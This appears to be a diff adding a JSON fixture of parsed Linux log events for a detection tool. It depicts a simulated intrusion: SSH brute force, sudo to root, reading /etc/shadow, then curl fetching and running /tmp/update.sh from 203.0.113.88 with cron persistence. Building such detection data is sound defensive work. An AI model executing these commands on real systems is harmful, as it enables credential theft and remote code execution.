@@ -1,0 +1,433 @@
+{
+    "events": [
+        {
+            "event_id": "SSH-00001",
+            "timestamp": "2026-10-06T15:30:01+00:00",
+            "source": "ssh",
+            "event_type": "SSH_AUTH_FAILURE",
+            "message": "Failed SSH password authentication",
+            "user": "test",
+            "source_ip": "203.0.113.88",
+            "process": "15",
+            "pid": null,
+            "command": null,
+            "severity": "MEDIUM",
+            "raw": "Oct  6 15:30:01 server sshd[6101]: Failed password for invalid user test from 203.0.113.88 port 50001 ssh2",
+            "metadata": {
+                "authentication": "password",
+                "result": "failure",
+                "port": 50001
+            }
+        },
+        {
+            "event_id": "SSH-00002",
+            "timestamp": "2026-10-06T15:30:03+00:00",
+            "source": "ssh",
+            "event_type": "SSH_AUTH_FAILURE",
+            "message": "Failed SSH password authentication",
+            "user": "admin",
+            "source_ip": "203.0.113.88",
+            "process": "15",
+            "pid": null,
+            "command": null,
+            "severity": "MEDIUM",
+            "raw": "Oct  6 15:30:03 server sshd[6102]: Failed password for invalid user admin from 203.0.113.88 port 50002 ssh2",
+            "metadata": {
+                "authentication": "password",
+                "result": "failure",
+                "port": 50002
+            }
+        },
+        {
+            "event_id": "AUTH-00001",
+            "timestamp": "2026-10-06T15:30:05+00:00",
+            "source": "auth.log",
+            "event_type": "SSH_AUTH_FAILURE",
+            "message": "Failed SSH password authentication",
+            "user": "root",
+            "source_ip": "203.0.113.88",
+            "process": "15",
+            "pid": null,
+            "command": null,
+            "severity": "MEDIUM",
+            "raw": "Oct  6 15:30:05 server sshd[6103]: Failed password for root from 203.0.113.88 port 50003 ssh2",
+            "metadata": {
+                "port": 50003,
+                "authentication": "password",
+                "result": "failure"
+            }
+        },
+        {
+            "event_id": "SSH-00003",
+            "timestamp": "2026-10-06T15:30:05+00:00",
+            "source": "ssh",
+            "event_type": "SSH_AUTH_FAILURE",
+            "message": "Failed SSH password authentication",
+            "user": "root",
+            "source_ip": "203.0.113.88",
+            "process": "15",
+            "pid": null,
+            "command": null,
+            "severity": "MEDIUM",
+            "raw": "Oct  6 15:30:05 server sshd[6103]: Failed password for root from 203.0.113.88 port 50003 ssh2",
+            "metadata": {
+                "authentication": "password",
+                "result": "failure",
+                "port": 50003
+            }
+        },
+        {
+            "event_id": "AUTH-00002",
+            "timestamp": "2026-10-06T15:30:12+00:00",
+            "source": "auth.log",
+            "event_type": "SSH_AUTH_SUCCESS",
+            "message": "Successful SSH password authentication",
+            "user": "analyst",
+            "source_ip": "203.0.113.88",
+            "process": "15",
+            "pid": null,
+            "command": null,
+            "severity": "INFO",
+            "raw": "Oct  6 15:30:12 server sshd[6104]: Accepted password for analyst from 203.0.113.88 port 50004 ssh2",
+            "metadata": {
+                "port": 50004,
+                "authentication": "password",
+                "result": "success"
+            }
+        },
+        {
+            "event_id": "SSH-00004",
+            "timestamp": "2026-10-06T15:30:12+00:00",
+            "source": "ssh",
+            "event_type": "SSH_AUTH_SUCCESS",
+            "message": "Successful SSH password authentication",
+            "user": "analyst",
+            "source_ip": "203.0.113.88",
+            "process": "15",
+            "pid": null,
+            "command": null,
+            "severity": "INFO",
+            "raw": "Oct  6 15:30:12 server sshd[6104]: Accepted password for analyst from 203.0.113.88 port 50004 ssh2",
+            "metadata": {
+                "authentication": "password",
+                "result": "success",
+                "port": 50004
+            }
+        },
+        {
+            "event_id": "SUDO-00001",
+            "timestamp": "2026-10-06T15:32:10+00:00",
+            "source": "sudo",
+            "event_type": "SUDO_COMMAND",
+            "message": "User executed command through sudo",
+            "user": "analyst",
+            "source_ip": null,
+            "process": "15",
+            "pid": null,
+            "command": "/bin/bash",
+            "severity": "CRITICAL",
+            "raw": "Oct  6 15:32:10 server sudo: analyst : TTY=pts/0 ; PWD=/home/analyst ; USER=root ; COMMAND=/bin/bash",
+            "metadata": {
+                "tty": "pts/0",
+                "pwd": "/home/analyst",
+                "target_user": "root",
+                "privilege_change": true,
+                "privilege_transition": "analyst->root"
+            }
+        },
+        {
+            "event_id": "SUDO-00002",
+            "timestamp": "2026-10-06T15:32:15+00:00",
+            "source": "sudo",
+            "event_type": "SUDO_COMMAND",
+            "message": "User executed command through sudo",
+            "user": "analyst",
+            "source_ip": null,
+            "process": "15",
+            "pid": null,
+            "command": "/usr/bin/id",
+            "severity": "CRITICAL",
+            "raw": "Oct  6 15:32:15 server sudo: analyst : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/id",
+            "metadata": {
+                "tty": "pts/0",
+                "pwd": "/root",
+                "target_user": "root",
+                "privilege_change": true,
+                "privilege_transition": "analyst->root"
+            }
+        },
+        {
+            "event_id": "SUDO-00003",
+            "timestamp": "2026-10-06T15:32:21+00:00",
+            "source": "sudo",
+            "event_type": "SUDO_COMMAND",
+            "message": "User executed command through sudo",
+            "user": "analyst",
+            "source_ip": null,
+            "process": "15",
+            "pid": null,
+            "command": "/usr/bin/cat /etc/shadow",
+            "severity": "CRITICAL",
+            "raw": "Oct  6 15:32:21 server sudo: analyst : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow",
+            "metadata": {
+                "tty": "pts/0",
+                "pwd": "/root",
+                "target_user": "root",
+                "privilege_change": true,
+                "privilege_transition": "analyst->root"
+            }
+        },
+        {
+            "event_id": "SYSLOG-00001",
+            "timestamp": "2026-10-06T15:33:01+00:00",
+            "source": "syslog",
+            "event_type": "SYSLOG_EVENT",
+            "message": "General Linux system event",
+            "user": null,
+            "source_ip": null,
+            "process": "15",
+            "pid": null,
+            "command": null,
+            "severity": "INFO",
+            "raw": "Oct  6 15:33:01 server cron[6110]: (root) CMD (/tmp/update.sh)",
+            "metadata": {
+                "parser": "syslog",
+                "classification": "SYSLOG_EVENT"
+            }
+        },
+        {
+            "event_id": "SYSLOG-00002",
+            "timestamp": "2026-10-06T15:34:01+00:00",
+            "source": "syslog",
+            "event_type": "SYSLOG_EVENT",
+            "message": "General Linux system event",
+            "user": null,
+            "source_ip": null,
+            "process": "15",
+            "pid": null,
+            "command": null,
+            "severity": "INFO",
+            "raw": "Oct  6 15:34:01 server cron[6111]: (root) CMD (/tmp/update.sh)",
+            "metadata": {
+                "parser": "syslog",
+                "classification": "SYSLOG_EVENT"
+            }
+        },
+        {
+            "event_id": "SYSLOG-00003",
+            "timestamp": "2026-10-06T15:35:01+00:00",
+            "source": "syslog",
+            "event_type": "SYSLOG_EVENT",
+            "message": "General Linux system event",
+            "user": null,
+            "source_ip": null,
+            "process": "15",
+            "pid": null,
+            "command": null,
+            "severity": "INFO",
+            "raw": "Oct  6 15:35:01 server cron[6112]: (root) CMD (/tmp/update.sh)",
+            "metadata": {
+                "parser": "syslog",
+                "classification": "SYSLOG_EVENT"
+            }
+        },
+        {
+            "event_id": "BASH-00001",
+            "timestamp": "2026-10-06T20:08:57.631866+00:00",
+            "source": "bash_history",
+            "event_type": "BASH_COMMAND",
+            "message": "Bash command executed",
+            "user": null,
+            "source_ip": null,
+            "process": null,
+            "pid": null,
+            "command": "whoami",
+            "severity": "INFO",
+            "raw": "whoami",
+            "metadata": {
+                "shell": "bash",
+                "classification": "BASH_COMMAND"
+            }
+        },
+        {
+            "event_id": "BASH-00002",
+            "timestamp": "2026-10-06T20:08:57.631929+00:00",
+            "source": "bash_history",
+            "event_type": "BASH_COMMAND",
+            "message": "Bash command executed",
+            "user": null,
+            "source_ip": null,
+            "process": null,
+            "pid": null,
+            "command": "id",
+            "severity": "INFO",
+            "raw": "id",
+            "metadata": {
+                "shell": "bash",
+                "classification": "BASH_COMMAND"
+            }
+        },
+        {
+            "event_id": "BASH-00003",
+            "timestamp": "2026-10-06T20:08:57.631957+00:00",
+            "source": "bash_history",
+            "event_type": "BASH_COMMAND",
+            "message": "Bash command executed",
+            "user": null,
+            "source_ip": null,
+            "process": null,
+            "pid": null,
+            "command": "uname -a",
+            "severity": "INFO",
+            "raw": "uname -a",
+            "metadata": {
+                "shell": "bash",
+                "classification": "BASH_COMMAND"
+            }
+        },
+        {
+            "event_id": "BASH-00004",
+            "timestamp": "2026-10-06T20:08:57.631982+00:00",
+            "source": "bash_history",
+            "event_type": "BASH_COMMAND",
+            "message": "Bash command executed",
+            "user": null,
+            "source_ip": null,
+            "process": null,
+            "pid": null,
+            "command": "ip addr",
+            "severity": "INFO",
+            "raw": "ip addr",
+            "metadata": {
+                "shell": "bash",
+                "classification": "BASH_COMMAND"
+            }
+        },
+        {
+            "event_id": "BASH-00005",
+            "timestamp": "2026-10-06T20:08:57.632003+00:00",
+            "source": "bash_history",
+            "event_type": "NETWORK_RECON",
+            "message": "Potential network reconnaissance command",
+            "user": null,
+            "source_ip": null,
+            "process": null,
+            "pid": null,
+            "command": "ss -tulpn",
+            "severity": "MEDIUM",
+            "raw": "ss -tulpn",
+            "metadata": {
+                "shell": "bash",
+                "classification": "NETWORK_RECON"
+            }
+        },
+        {
+            "event_id": "BASH-00006",
+            "timestamp": "2026-10-06T20:08:57.632017+00:00",
+            "source": "bash_history",
+            "event_type": "SUDO_COMMAND",
+            "message": "Command executed through sudo",
+            "user": null,
+            "source_ip": null,
+            "process": null,
+            "pid": null,
+            "command": "sudo -i",
+            "severity": "HIGH",
+            "raw": "sudo -i",
+            "metadata": {
+                "shell": "bash",
+                "classification": "SUDO_COMMAND"
+            }
+        },
+        {
+            "event_id": "BASH-00007",
+            "timestamp": "2026-10-06T20:08:57.632028+00:00",
+            "source": "bash_history",
+            "event_type": "CREDENTIAL_ACCESS",
+            "message": "Potential credential or authentication data access",
+            "user": null,
+            "source_ip": null,
+            "process": null,
+            "pid": null,
+            "command": "cat /etc/shadow",
+            "severity": "HIGH",
+            "raw": "cat /etc/shadow",
+            "metadata": {
+                "shell": "bash",
+                "classification": "CREDENTIAL_ACCESS"
+            }
+        },
+        {
+            "event_id": "BASH-00008",
+            "timestamp": "2026-10-06T20:08:57.632102+00:00",
+            "source": "bash_history",
+            "event_type": "PERSISTENCE",
+            "message": "Potential persistence-related command",
+            "user": null,
+            "source_ip": null,
+            "process": null,
+            "pid": null,
+            "command": "crontab -e",
+            "severity": "HIGH",
+            "raw": "crontab -e",
+            "metadata": {
+                "shell": "bash",
+                "classification": "PERSISTENCE"
+            }
+        },
+        {
+            "event_id": "BASH-00009",
+            "timestamp": "2026-10-06T20:08:57.632449+00:00",
+            "source": "bash_history",
+            "event_type": "DOWNLOAD",
+            "message": "Potential remote file download",
+            "user": null,
+            "source_ip": null,
+            "process": null,
+            "pid": null,
+            "command": "curl http://203.0.113.88/update.sh -o /tmp/update.sh",
+            "severity": "MEDIUM",
+            "raw": "curl http://203.0.113.88/update.sh -o /tmp/update.sh",
+            "metadata": {
+                "shell": "bash",
+                "classification": "DOWNLOAD"
+            }
+        },
+        {
+            "event_id": "BASH-00010",
+            "timestamp": "2026-10-06T20:08:57.632515+00:00",
+            "source": "bash_history",
+            "event_type": "BASH_COMMAND",
+            "message": "Bash command executed",
+            "user": null,
+            "source_ip": null,
+            "process": null,
+            "pid": null,
+            "command": "chmod +x /tmp/update.sh",
+            "severity": "INFO",
+            "raw": "chmod +x /tmp/update.sh",
+            "metadata": {
+                "shell": "bash",
+                "classification": "BASH_COMMAND"
+            }
+        },
+        {
+            "event_id": "BASH-00011",
+            "timestamp": "2026-10-06T20:08:57.632546+00:00",
+            "source": "bash_history",
+            "event_type": "BASH_COMMAND",
+            "message": "Bash command executed",
+            "user": null,
+            "source_ip": null,
+            "process": null,
+            "pid": null,
+            "command": "/tmp/update.sh",
+            "severity": "INFO",
+            "raw": "/tmp/update.sh",
+            "metadata": {
+                "shell": "bash",
+                "classification": "BASH_COMMAND"
+            }
+        }
+    ]
+}
